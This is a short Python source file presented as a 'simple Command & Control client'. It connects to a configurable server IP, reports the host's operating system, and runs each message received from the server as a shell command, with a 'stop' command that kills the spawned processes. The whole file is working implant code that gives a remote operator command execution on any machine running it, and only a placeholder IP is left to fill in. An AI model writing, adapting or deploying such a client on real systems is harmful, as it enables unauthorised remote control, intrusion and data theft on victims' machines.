"""
Author: Alex Perrakis
Description: A simple Command & Control client that connects to the server.
"""

import socket
import subprocess
import os
import signal
import platform
import psutil
import distro

def terminate_subprocesses(subprocesses):
    for proc in subprocesses:
        if psutil.pid_exists(proc.pid):
            parent = psutil.Process(proc.pid)
            children = parent.children(recursive=True)
            for child in children:
                child.terminate()
            parent.terminate()

def get_os_description():
    os_type = str(platform.system())
    release = str(platform.release())
    arch = str(platform.architecture()[0])
    distro_name = str(distro.name())

    os_disc = os_type + " " + release + " (" + arch + ")"

    if os_type == "Linux":
        os_disc = os_type + " " + release + " " + distro_name + " (" + arch + ")"

    return os_disc


def client():
    SERVER_IP = '<INSERT IP HERE>'  # server's IP address 
    SERVER_PORT = 8888		    # server's port
    subprocesses = []

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print("Connected to the server.")

            # Get the operating system type
            os_disc= get_os_description()

            # Send the operating system type to the server immediately after connecting
            client_socket.send(os_disc.encode())

            while True:
                # Receive the message from the server
                message = client_socket.recv(1024).decode('utf-8')
                if not message:  # Check for empty message (server closed connection)
                    print("Server closed the connection. Exiting.")
                    break
                
                print(f"Received from server: {message}")
                
                if message.strip() == "stop":
                    print("Received stop command. Stopping subprocesses.")
                    terminate_subprocesses(subprocesses)
                    subprocesses.clear()
                else:
                    # Execute the command received from the server
                    proc = subprocess.Popen(message, shell=True)
                    subprocesses.append(proc)

        except ConnectionRefusedError:
            print("Connection was refused. Server may not be available or running.")
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    client()
